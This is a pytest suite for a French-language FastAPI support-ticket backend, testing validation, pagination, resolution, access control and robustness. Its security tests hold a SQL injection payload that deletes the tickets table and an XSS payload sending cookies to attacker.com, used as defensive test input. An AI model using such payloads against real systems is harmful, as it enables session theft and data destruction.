import asyncio
import logging
import pytest
from unittest.mock import patch, MagicMock
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from backend.config import settings
from backend.models import Ticket, TicketStatus, KnowledgeArticle
from backend.services.ticket_service import TicketService
from backend.services.email_service import EmailService
from tests.conftest import TEST_API_KEY


@pytest.mark.asyncio
async def test_tickets_create_happy_path_creates_open_ticket(app_test_env, caplog):
    """
    1. FONCTIONNEL - Happy Path:
    Vérifie la création d'un ticket avec code HTTP 201.
    Vérifie l'état DB (status=OPEN, timestamps, question, automated_answer) et les logs.
    """
    client, session_maker, _ = app_test_env

    payload = {
        "user_id": 998877,
        "user_handle": "alice_smith",
        "question": "Impossible de me connecter à mon compte client",
        "automated_answer": "Essayez de réinitialiser votre mot de passe.",
    }

    with caplog.at_level(logging.INFO):
        response = await client.post("/api/tickets", json=payload)

    # 4. ASSERTIONS
    assert response.status_code == 201
    data = response.json()
    assert data["id"] is not None
    assert data["user_id"] == 998877
    assert data["user_handle"] == "alice_smith"
    assert data["status"] == TicketStatus.OPEN.value
    assert data["question"] == payload["question"]
    assert data["automated_answer"] == payload["automated_answer"]
    assert data["created_at"] is not None

    ticket_id = data["id"]

    # Vérification état DB réel
    async with session_maker() as session:
        ticket = (await session.execute(select(Ticket).where(Ticket.id == ticket_id))).scalar_one()
        assert ticket.status == "OPEN"
        assert ticket.user_id == 998877
        assert ticket.question == payload["question"]


@pytest.mark.asyncio
async def test_tickets_create_min_length_question_succeeds(app_test_env):
    """
    1. FONCTIONNEL - Cas limite Min:
    Une question de longueur 1 caractère est acceptée.
    """
    client, _, _ = app_test_env
    response = await client.post(
        "/api/tickets",
        json={"user_id": 1, "question": "?"},
    )
    assert response.status_code == 201
    assert response.json()["question"] == "?"


@pytest.mark.asyncio
async def test_tickets_create_empty_question_returns_422_validation_error(app_test_env):
    """
    1. FONCTIONNEL - Cas limite Vide:
    Une question vide est rejetée par Pydantic (422).
    """
    client, _, _ = app_test_env
    response = await client.post(
        "/api/tickets",
        json={"user_id": 1, "question": ""},
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_tickets_create_max_length_question_succeeds(app_test_env):
    """
    1. FONCTIONNEL - Cas limite Max:
    Une question de 4096 caractères est acceptée.
    """
    client, _, _ = app_test_env
    long_q = "X" * 4096
    response = await client.post(
        "/api/tickets",
        json={"user_id": 1, "question": long_q},
    )
    assert response.status_code == 201
    assert len(response.json()["question"]) == 4096


@pytest.mark.asyncio
async def test_tickets_create_exceeds_max_length_returns_422_validation_error(app_test_env):
    """
    1. FONCTIONNEL - Validation des entrées:
    Une question dépassant 4096 caractères renvoie 422.
    """
    client, _, _ = app_test_env
    too_long = "X" * 4097
    response = await client.post(
        "/api/tickets",
        json={"user_id": 1, "question": too_long},
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_tickets_create_unicode_and_emojis_stored_accurately(app_test_env):
    """
    1. FONCTIONNEL - Unicode / Emojis:
    Question et réponses contenant des caractères internationaux et emojis
    doivent être enregistrés et restitués fidèlement.
    """
    client, session_maker, _ = app_test_env
    q = "Erreur de paiement sur la facture #4521 💳 ! Déblocage urgent requis 🙏"
    ans = "Vérification en cours... ⏳"

    response = await client.post(
        "/api/tickets",
        json={"user_id": 42, "user_handle": "cécile_du_92", "question": q, "automated_answer": ans},
    )
    assert response.status_code == 201
    ticket_id = response.json()["id"]

    async with session_maker() as session:
        ticket = (await session.execute(select(Ticket).where(Ticket.id == ticket_id))).scalar_one()
        assert ticket.question == q
        assert ticket.automated_answer == ans


@pytest.mark.asyncio
async def test_tickets_list_pagination_limit_and_offset_works(app_test_env):
    """
    1. FONCTIONNEL - Pagination:
    Vérifie le fonctionnement précis des paramètres limit et offset sur /api/tickets.
    """
    client, session_maker, _ = app_test_env

    # Création de 5 tickets
    async with session_maker() as session:
        for i in range(1, 6):
            await TicketService.create_ticket(
                session=session, user_id=100 + i, user_handle=f"user_{i}", question=f"Question {i}"
            )

    # Récupérer limit=2, offset=0
    resp1 = await client.get("/api/tickets?limit=2&offset=0")
    assert resp1.status_code == 200
    tickets_page1 = resp1.json()
    assert len(tickets_page1) == 2

    # Récupérer limit=2, offset=2
    resp2 = await client.get("/api/tickets?limit=2&offset=2")
    assert resp2.status_code == 200
    tickets_page2 = resp2.json()
    assert len(tickets_page2) == 2

    # Vérification que les pages ne se chevauchent pas
    ids1 = {t["id"] for t in tickets_page1}
    ids2 = {t["id"] for t in tickets_page2}
    assert ids1.isdisjoint(ids2)


@pytest.mark.asyncio
async def test_tickets_list_filter_by_status_returns_matching_only(app_test_env):
    """
    1. FONCTIONNEL - Filtrage:
    Vérifie le filtrage par statut (OPEN vs RESOLVED).
    """
    client, session_maker, _ = app_test_env

    async with session_maker() as session:
        t1 = await TicketService.create_ticket(session, 1, "u1", "Q1")
        t2 = await TicketService.create_ticket(session, 2, "u2", "Q2")
        await TicketService.resolve_ticket(session, t2.id, "Solution 2", "agent_1")

    # Filtre OPEN
    resp_open = await client.get("/api/tickets?status_filter=OPEN")
    assert resp_open.status_code == 200
    open_tickets = resp_open.json()
    assert all(t["status"] == "OPEN" for t in open_tickets)
    assert any(t["id"] == t1.id for t in open_tickets)

    # Filtre RESOLVED
    resp_res = await client.get("/api/tickets?status_filter=RESOLVED")
    assert resp_res.status_code == 200
    resolved_tickets = resp_res.json()
    assert all(t["status"] == "RESOLVED" for t in resolved_tickets)
    assert any(t["id"] == t2.id for t in resolved_tickets)


@pytest.mark.asyncio
async def test_tickets_list_invalid_status_filter_returns_422_validation_error(app_test_env):
    """
    1. FONCTIONNEL - Erreurs attendues:
    Un statut inconnu dans status_filter renvoie 422.
    """
    client, _, _ = app_test_env
    resp = await client.get("/api/tickets?status_filter=NON_EXISTENT")
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_tickets_get_by_id_found_returns_200_and_ticket_details(app_test_env):
    """
    1. FONCTIONNEL:
    GET /api/tickets/{id} retourne 200 et les informations complètes du ticket.
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 123, "john", "Ma question")

    response = await client.get(f"/api/tickets/{ticket.id}")
    assert response.status_code == 200
    assert response.json()["id"] == ticket.id
    assert response.json()["question"] == "Ma question"


@pytest.mark.asyncio
async def test_tickets_get_by_id_not_found_returns_404_not_found(app_test_env):
    """
    1. FONCTIONNEL - Erreur attendue:
    GET /api/tickets/999999 retourne 404.
    """
    client, _, _ = app_test_env
    response = await client.get("/api/tickets/999999")
    assert response.status_code == 404
    assert "Ticket not found" in response.json()["detail"]


@pytest.mark.asyncio
async def test_tickets_attach_support_card_updates_message_id_in_db(app_test_env):
    """
    1. FONCTIONNEL:
    POST /api/tickets/{id}/support-card associe l'ID du message Telegram du groupe support.
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 10, "u", "Q")

    response = await client.post(
        f"/api/tickets/{ticket.id}/support-card",
        json={"message_id": 884422},
    )
    assert response.status_code == 200
    assert response.json()["support_group_message_id"] == 884422

    # Vérification DB
    async with session_maker() as session:
        refreshed = (await session.execute(select(Ticket).where(Ticket.id == ticket.id))).scalar_one()
        assert refreshed.support_group_message_id == 884422


@pytest.mark.asyncio
async def test_tickets_get_by_support_message_id_returns_ticket(app_test_env):
    """
    1. FONCTIONNEL:
    GET /api/tickets/by-support-message/{message_id} retrouve le ticket associé.
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 10, "u", "Q")
        await TicketService.attach_support_card(session, ticket.id, 999111)

    response = await client.get("/api/tickets/by-support-message/999111")
    assert response.status_code == 200
    assert response.json()["id"] == ticket.id


@pytest.mark.asyncio
async def test_tickets_get_by_support_message_id_not_found_returns_404(app_test_env):
    """
    1. FONCTIONNEL:
    GET /api/tickets/by-support-message/123456789 non associé renvoie 404.
    """
    client, _, _ = app_test_env
    response = await client.get("/api/tickets/by-support-message/123456789")
    assert response.status_code == 404


@pytest.mark.asyncio
async def test_tickets_resolve_happy_path_resolves_and_ingests_kb(app_test_env):
    """
    1. FONCTIONNEL & EFFETS DE BORD:
    Résolution d'un ticket: passe le statut à RESOLVED, stocke la solution et le résolveur,
    et déclenche automatiquement l'ingestion dans la Knowledge Base (source_ticket_id).
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 55, "claire", "Comment activer la 2FA ?")

    resolve_payload = {
        "solution": "Rendez-vous dans Sécurité > Activer l'authentification à deux facteurs.",
        "resolved_by": "agent_claire",
        "resolution_channel": "TELEGRAM",
        "add_to_knowledge_base": True,
    }
    response = await client.post(f"/api/tickets/{ticket.id}/resolve", json=resolve_payload)
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "RESOLVED"
    assert data["is_newly_resolved"] is True
    assert data["solution"] == resolve_payload["solution"]
    assert data["resolved_by"] == "agent_claire"

    # Vérification état DB Ticket + KB
    async with session_maker() as session:
        db_ticket = (await session.execute(select(Ticket).where(Ticket.id == ticket.id))).scalar_one()
        assert db_ticket.status == "RESOLVED"
        assert db_ticket.resolved_at is not None

        # Vérification effet de bord: article KB créé
        kb_stmt = select(KnowledgeArticle).where(KnowledgeArticle.source_ticket_id == ticket.id)
        kb_art = (await session.execute(kb_stmt)).scalar_one()
        assert kb_art.question == "Comment activer la 2FA ?"
        assert "Activer l'authentification à deux facteurs" in kb_art.solution


@pytest.mark.asyncio
async def test_tickets_resolve_idempotence_second_call_returns_not_newly_resolved(app_test_env):
    """
    1. FONCTIONNEL - Idempotence:
    Résoudre un ticket déjà résolu ne doit pas créer de second article dans la KB
    ni réémettre de notification Telegram. is_newly_resolved doit être False.
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 1, "u", "Q")

    payload = {"solution": "Première solution", "resolved_by": "agent1"}
    resp1 = await client.post(f"/api/tickets/{ticket.id}/resolve", json=payload)
    assert resp1.status_code == 200
    assert resp1.json()["is_newly_resolved"] is True

    # Deuxième appel de résolution
    payload2 = {"solution": "Deuxième tentative", "resolved_by": "agent2"}
    resp2 = await client.post(f"/api/tickets/{ticket.id}/resolve", json=payload2)
    assert resp2.status_code == 200
    assert resp2.json()["is_newly_resolved"] is False

    # Vérification: pas de doublon dans la base de connaissances
    async with session_maker() as session:
        kb_articles = (
            await session.execute(
                select(KnowledgeArticle).where(KnowledgeArticle.source_ticket_id == ticket.id)
            )
        ).scalars().all()
        assert len(kb_articles) == 1


# ==============================================================================
# 2. SÉCURITÉ
# ==============================================================================


@pytest.mark.asyncio
async def test_tickets_unauthorized_endpoints_return_401(unauth_client):
    """
    2. SÉCURITÉ - Authz / Headers:
    Tous les endpoints de tickets doivent refuser les accès sans clé d'API valide.
    """
    endpoints = [
        ("POST", "/api/tickets", {"user_id": 1, "question": "Q"}),
        ("GET", "/api/tickets", None),
        ("GET", "/api/tickets/1", None),
        ("POST", "/api/tickets/1/resolve", {"solution": "Sol"}),
        ("POST", "/api/tickets/1/support-card", {"message_id": 123}),
        ("GET", "/api/tickets/by-support-message/123", None),
    ]

    for method, path, json_body in endpoints:
        if method == "POST":
            resp = await unauth_client.post(path, json=json_body)
        else:
            resp = await unauth_client.get(path)
        assert resp.status_code == 401, f"Failed on {method} {path}"


@pytest.mark.asyncio
async def test_tickets_sql_injection_in_question_and_solution_handled_safely(app_test_env):
    """
    2. SÉCURITÉ - Injection SQL:
    Test d'injection SQL dans les champs question et solution des tickets.
    """
    client, session_maker, _ = app_test_env

    sql_inj = "') UNION SELECT 1, 'admin', 'hacked', 'OPEN', NULL, NULL, NULL, NULL, NULL, NULL, NULL; --"
    response = await client.post(
        "/api/tickets",
        json={"user_id": 1337, "question": sql_inj},
    )
    assert response.status_code == 201
    ticket_id = response.json()["id"]

    # Résolution avec payload SQL
    resolve_sql = "'); DELETE FROM tickets WHERE '1'='1"
    res_resp = await client.post(
        f"/api/tickets/{ticket_id}/resolve",
        json={"solution": resolve_sql, "resolved_by": "admin'--"},
    )
    assert res_resp.status_code == 200

    # Vérification intégrité de la table tickets
    async with session_maker() as session:
        t = (await session.execute(select(Ticket).where(Ticket.id == ticket_id))).scalar_one()
        assert t.solution == resolve_sql
        total = len((await session.execute(select(Ticket))).scalars().all())
        assert total >= 1


@pytest.mark.asyncio
async def test_tickets_xss_payload_in_solution_stored_safely(app_test_env):
    """
    2. SÉCURITÉ - XSS:
    Test de payload XSS dans la solution d'un ticket.
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 10, "u", "XSS Question")

    xss = "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"
    response = await client.post(
        f"/api/tickets/{ticket.id}/resolve",
        json={"solution": xss},
    )
    assert response.status_code == 200
    assert response.json()["solution"] == xss


@pytest.mark.asyncio
async def test_tickets_idor_access_control_verification(app_test_env):
    """
    2. SÉCURITÉ - IDOR / Contrôle d'accès:
    Vérifie le comportement du système lors de la consultation de tickets appartenant
    à différents utilisateurs.
    Note d'audit: Le backend actuel repose sur un modèle d'API Key partagée de confiance
    entre le Bot Telegram et le Backend FastAPI (pas de token JWT utilisateur individuel).
    """
    client, session_maker, _ = app_test_env

    async with session_maker() as session:
        ticket_user_a = await TicketService.create_ticket(session, user_id=1001, user_handle="user_a", question="A")
        ticket_user_b = await TicketService.create_ticket(session, user_id=2002, user_handle="user_b", question="B")

    # Avec l'API Key partagée du Bot, l'accès aux deux tickets est autorisé pour le bot
    resp_a = await client.get(f"/api/tickets/{ticket_user_a.id}")
    resp_b = await client.get(f"/api/tickets/{ticket_user_b.id}")
    assert resp_a.status_code == 200
    assert resp_b.status_code == 200


@pytest.mark.asyncio
async def test_tickets_user_id_scoping_prevents_cross_user_idor_access(app_test_env):
    """
    2. SÉCURITÉ - IDOR / Contrôle d'accès par user_id:
    Vérifie que spécifier ?user_id= restreint la consultation aux tickets appartenant à cet utilisateur.
    Accéder au ticket d'un autre utilisateur avec un scope utilisateur renvoie 404 (non trouvé).
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        t_alice = await TicketService.create_ticket(session, user_id=1001, user_handle="alice", question="Alice Q")
        t_bob = await TicketService.create_ticket(session, user_id=2002, user_handle="bob", question="Bob Q")

    # 1. Alice accède à son propre ticket avec user_id=1001 -> 200 OK
    resp_alice_own = await client.get(f"/api/tickets/{t_alice.id}?user_id=1001")
    assert resp_alice_own.status_code == 200
    assert resp_alice_own.json()["id"] == t_alice.id

    # 2. Alice tente d'accéder au ticket de Bob avec son user_id=1001 -> 404 IDOR protection
    resp_alice_on_bob = await client.get(f"/api/tickets/{t_bob.id}?user_id=1001")
    assert resp_alice_on_bob.status_code == 404
    assert "Ticket not found" in resp_alice_on_bob.json()["detail"]

    # 3. Listing des tickets avec user_id=1001 ne renvoie que les tickets d'Alice
    resp_list = await client.get("/api/tickets?user_id=1001")
    assert resp_list.status_code == 200
    listed_ids = [t["id"] for t in resp_list.json()]
    assert t_alice.id in listed_ids
    assert t_bob.id not in listed_ids


@pytest.mark.asyncio
async def test_tickets_secrets_not_logged_during_creation_and_resolution(app_test_env, caplog):
    """
    2. SÉCURITÉ - Secrets dans les logs:
    S'assure que la clé secrète API_KEY ne fuite pas dans les logs du serveur.
    """
    client, _, _ = app_test_env
    with caplog.at_level(logging.DEBUG):
        res = await client.post("/api/tickets", json={"user_id": 99, "question": "Check logs"})
        ticket_id = res.json()["id"]
        await client.post(f"/api/tickets/{ticket_id}/resolve", json={"solution": "Check logs sol"})

    for record in caplog.records:
        assert TEST_API_KEY not in record.getMessage()


# ==============================================================================
# 3. ROBUSTESSE
# ==============================================================================


@pytest.mark.asyncio
async def test_tickets_concurrent_resolutions_race_condition_protection(app_test_env):
    """
    3. ROBUSTESSE - Concurrence:
    Résolutions concurrentes simultanées d'un même ticket.
    Vérifie qu'exactement une requête est marquée `is_newly_resolved=True`
    et que la base de données ne contient aucun état corrompu ou doublon d'article.
    """
    client, session_maker, _ = app_test_env

    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 10, "bob", "Question concurrente")
        t_id = ticket.id

    async def do_resolve(agent_id: int):
        return await client.post(
            f"/api/tickets/{t_id}/resolve",
            json={"solution": f"Solution concurrente {agent_id}", "resolved_by": f"agent_{agent_id}"},
        )

    responses = await asyncio.gather(*(do_resolve(i) for i in range(8)))
    assert all(r.status_code == 200 for r in responses)

    newly_resolved_flags = [r.json().get("is_newly_resolved") for r in responses]
    # Au moins une (idéalement exactement une) requête effectue la première transition
    assert True in newly_resolved_flags

    # Vérification DB finale
    async with session_maker() as session:
        t = (await session.execute(select(Ticket).where(Ticket.id == t_id))).scalar_one()
        assert t.status == "RESOLVED"

        kb_articles = (
            await session.execute(select(KnowledgeArticle).where(KnowledgeArticle.source_ticket_id == t_id))
        ).scalars().all()
        # Grâce à l'upsert par source_ticket_id, un seul article existe
        assert len(kb_articles) == 1


@pytest.mark.asyncio
async def test_tickets_background_email_dispatch_failure_does_not_fail_ticket_creation(app_test_env, monkeypatch):
    """
    3. ROBUSTESSE - Tolérance aux pannes dépendance externe:
    Si l'envoi SMTP échoue (ex: serveur SMTP inaccessible retournant False),
    la création du ticket doit tout de même réussir (HTTP 201) et le ticket doit être persisté en DB.
    """
    client, session_maker, _ = app_test_env

    # Simuler un échec SMTP capturé par le service (retourne False)
    monkeypatch.setattr(EmailService, "_send_smtp_sync", lambda msg: False)

    response = await client.post(
        "/api/tickets",
        json={"user_id": 500, "user_handle": "sam", "question": "Ticket malgré panne SMTP"},
    )
    assert response.status_code == 201
    ticket_id = response.json()["id"]

    # Le ticket existe bien en base
    async with session_maker() as session:
        ticket = (await session.execute(select(Ticket).where(Ticket.id == ticket_id))).scalar_one()
        assert ticket.question == "Ticket malgré panne SMTP"


@pytest.mark.asyncio
async def test_tickets_background_tasks_uncaught_exception_isolated_and_logged(app_test_env, caplog):
    """
    3. ROBUSTESSE - Isolation des pannes non gérées en BackgroundTasks:
    Vérifie qu'une exception brutale (ex: socket dropout, bug inattendu) dans la tâche
    de fond EmailService ne se propage pas à l'Event Loop ASGI / Starlette et ne
    déclenche pas une erreur HTTP 500 pour le client après commit DB.
    """
    client, session_maker, _ = app_test_env

    # 1. Création avec crash direct de la coroutine
    with patch(
        "backend.services.email_service.EmailService.send_ticket_created_notification",
        side_effect=ConnectionResetError("Fatal SMTP drop"),
    ):
        with caplog.at_level(logging.ERROR):
            resp_create = await client.post(
                "/api/tickets",
                json={"user_id": 666, "question": "Crash background test"},
            )

    assert resp_create.status_code == 201
    created_id = resp_create.json()["id"]

    # 2. Résolution avec crash direct de la coroutine
    with patch(
        "backend.services.email_service.EmailService.send_ticket_resolved_notification",
        side_effect=TimeoutError("Fatal SMTP timeout"),
    ):
        with caplog.at_level(logging.ERROR):
            resp_resolve = await client.post(
                f"/api/tickets/{created_id}/resolve",
                json={"solution": "Résolu malgré crash", "resolution_channel": "TELEGRAM"},
            )

    assert resp_resolve.status_code == 200
    assert resp_resolve.json()["status"] == "RESOLVED"

    # Vérification que les exceptions ont été interceptées et loggées
    error_logs = [r.getMessage() for r in caplog.records if r.levelno == logging.ERROR]
    assert any("failed with exception: Fatal SMTP drop" in msg for msg in error_logs)
    assert any("failed with exception: Fatal SMTP timeout" in msg for msg in error_logs)
